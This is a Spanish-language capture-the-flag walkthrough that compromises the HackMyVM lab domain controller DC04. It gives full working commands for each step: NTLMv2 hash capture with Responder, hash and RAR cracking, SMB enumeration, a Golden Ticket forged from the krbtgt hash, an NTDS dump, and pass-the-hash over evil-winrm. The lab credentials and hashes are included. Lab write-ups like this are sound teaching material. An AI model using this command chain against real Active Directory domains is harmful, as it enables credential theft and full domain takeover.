# 🖥️ DC04 - soupedecode.local (HackMyVM)

> **Dificultad:** Intermedia  
> **OS:** Windows Server 2022  
> **IP:** 192.168.0.23 (variable en cada importación)  
> **Dominio:** SOUPEDECODE.LOCAL  
> **Host:** DC01  
> **Fecha:** 2026-04-19

---

## 📡 Reconocimiento

### Descubrimiento de host

```bash
sudo arp-scan -l
```

### Nmap completo

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 192.168.0.23
```

**Puertos abiertos:**
| Puerto | Servicio | Detalles |
|--------|----------|---------|
| 53/tcp | DNS | Simple DNS Plus |
| 80/tcp | HTTP | Apache 2.4.58 (Win64) PHP/8.2.12 |
| 88/tcp | Kerberos | Microsoft Windows Kerberos |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS | Microsoft Windows netbios-ssn |
| 389/tcp | LDAP | Active Directory LDAP |
| 445/tcp | SMB | Microsoft-DS |
| 464/tcp | kpasswd5 | — |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0 |
| 9389/tcp | ADWS | .NET Message Framing |

> ⚠️ El nmap detecta un **clock-skew de ~10 horas** — crítico para el ataque con Kerberos

---

## 🌐 Enumeración Web

### Virtual hosting

```bash
# Añadir al /etc/hosts
echo "192.168.0.23 dc01.soupedecode.local soupedecode.local heartbeat.soupedecode.local" | sudo tee -a /etc/hosts
```

### Fuzzing web

```bash
feroxbuster --url http://soupedecode.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:** `/server-status` accesible → revela vhost `heartbeat.soupedecode.local`

### Panel de login — heartbeat

Accediendo a `http://heartbeat.soupedecode.local/` encontramos un panel de login. Tras fuerza bruta controlada (WAF activo, banea tras ~40 intentos):

**Credenciales:** `admin:nimda`

Tras el login la aplicación solicita una IP para conectar a un recurso compartido de red — vector perfecto para capturar hashes NTLM.

---

## 🎣 Captura de Hash NTLMv2 — Responder

```bash
# Terminal 1
sudo responder -I eth0

# Terminal 2 — enviar nuestra IP a la app
curl -s -X POST http://heartbeat.soupedecode.local/login.php \
  -d "username=admin&password=nimda" -c /tmp/cookies.txt

curl -s -b /tmp/cookies.txt -X POST http://heartbeat.soupedecode.local/app.php \
  -d "ip=192.168.0.18"
```

**Hash NTLMv2 capturado:**
```
websvc::soupedecode:30d625c2dfc88fd4:B8552F5E230C5BF0...
```

---

## 🔨 Crackeo del hash — Hashcat

```bash
echo 'websvc::soupedecode:...' > /tmp/websvc.hash
hashcat -m 5600 /tmp/websvc.hash /usr/share/wordlists/rockyou.txt
```

**Credenciales:** `websvc:jordan23`

---

## 🔑 Cambio de contraseña expirada

```bash
nxc smb 192.168.0.23 -u websvc -p 'jordan23' -M change-password -o NEWPASS='Temporal1979!!'
```

---

## 📂 Enumeración SMB — usuarios y shares

```bash
nxc smb 192.168.0.23 -u websvc -p 'Temporal1979!!' --users 2>/dev/null | grep -i "rtina\|fjudy\|ojake\|xursula"
nxc smb 192.168.0.23 -u websvc -p 'Temporal1979!!' --shares
```

**Descubrimiento clave:** el usuario `rtina979` tiene la contraseña en su descripción:

```
rtina979 — Default Password Z~l3JhcV#7Q-1#M
```

**Shares accesibles:** `C` (READ), `IPC$`, `NETLOGON`, `SYSVOL`

---

## 🔑 Acceso a rtina979

```bash
# Contraseña expirada — cambiarla
nxc smb 192.168.0.23 -u rtina979 -p 'Z~l3JhcV#7Q-1#M' -M change-password -o NEWPASS='Temporal1979!!'
```

---

## 📦 Extracción del Report.rar

```bash
# Descargar el RAR desde el share C
smbclient //192.168.0.23/C -U 'soupedecode/rtina979%Temporal1979!!' \
  -c "cd Users\\rtina979\\Documents; get Report.rar /tmp/Report.rar"

# Crackear la contraseña del RAR
rar2john /tmp/Report.rar > /tmp/rar_hash.txt
john /tmp/rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Contraseña: PASSWORD123

# Extraer
cd /tmp && unrar x Report.rar
```

---

## 🎫 Golden Ticket Attack

El reporte HTML contiene un dump del NTDS con el hash de `krbtgt`:

```bash
grep -i "krbtgt" /tmp/Pentest\ Report.htm | grep -o 'krbtgt[^<]*' | head -2
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0b300b819241fc01cf3374cbe72c8cbd:::
```

**Hash NT de krbtgt:** `0b300b819241fc01cf3374cbe72c8cbd`

### SID del dominio

```bash
impacket-lookupsid soupedecode.local/rtina979:'Temporal1979!!'@192.168.0.23 | head -5
# Domain SID: S-1-5-21-2986980474-46765180-2505414164
```

### Generar el Golden Ticket

> ⚠️ **Clock skew crítico** — sincronizar la hora antes de generar el ticket

```bash
sudo timedatectl set-ntp false
sudo rdate -n 192.168.0.23 && \
rm -f /tmp/administrator.ccache && \
impacket-ticketer \
  -nthash 0b300b819241fc01cf3374cbe72c8cbd \
  -domain-sid S-1-5-21-2986980474-46765180-2505414164 \
  -domain soupedecode.local administrator && \
export KRB5CCNAME=/tmp/administrator.ccache
```

---

## 📥 NTDS Dump — Pass the Hash

```bash
nxc smb 192.168.0.23 -u administrator --use-kcache --ntds | grep -i "administrator:"
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:536a1787e6c4261388493937fcd0f444:::
```

**Hash NT del Administrator:** `536a1787e6c4261388493937fcd0f444`

---

## 🏆 Acceso como Administrator — Evil-WinRM

```bash
evil-winrm -i 192.168.0.23 -u administrator -H 536a1787e6c4261388493937fcd0f444
```

```powershell
type C:\Users\websvc\Desktop\user.txt
# 709e449a996a85aa7deaf18c79515d6a

type C:\Users\Administrator\Desktop\root.txt
# 1c66eabe105636d7e0b82ec1fa87cb7a
```

---

## 📝 Resumen del ataque

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | Nmap + feroxbuster | Puerto 80, virtual hosting heartbeat |
| Acceso web | Fuerza bruta WAF bypass | `admin:nimda` |
| Captura hash | Responder + SSRF via app | NTLMv2 de `websvc` |
| Crackeo | Hashcat rockyou | `websvc:jordan23` |
| Enumeración AD | nxc SMB --users | Contraseña en descripción `rtina979` |
| Extracción | SMB → Report.rar → john | Hash krbtgt del reporte |
| Escalada | Golden Ticket + NTDS dump | Hash NT Administrator |
| Acceso final | Pass-the-Hash evil-winrm | Administrator |

---

## 💡 Lecciones aprendidas

- **Virtual hosting** — siempre revisar `/server-status` de Apache para descubrir vhosts
- **WAF bypass** — limitar intentos de fuerza bruta, usar wordlists cortas y específicas
- **SSRF via formulario de IP** — cualquier app que conecte a una IP arbitraria es candidata a captura NTLM
- **Contraseñas en descripciones LDAP** — campo habitual de malas prácticas de admins
- **Clock skew en Kerberos** — sincronizar SIEMPRE con `rdate` antes de generar tickets, y encadenar el comando para evitar que el NTP del sistema revierta la hora
- **Golden Ticket** — con el hash de `krbtgt` se puede impersonar cualquier usuario del dominio indefinidamente
- **Pass-the-Hash** — con el hash NT del Administrator se puede entrar por WinRM sin conocer la contraseña
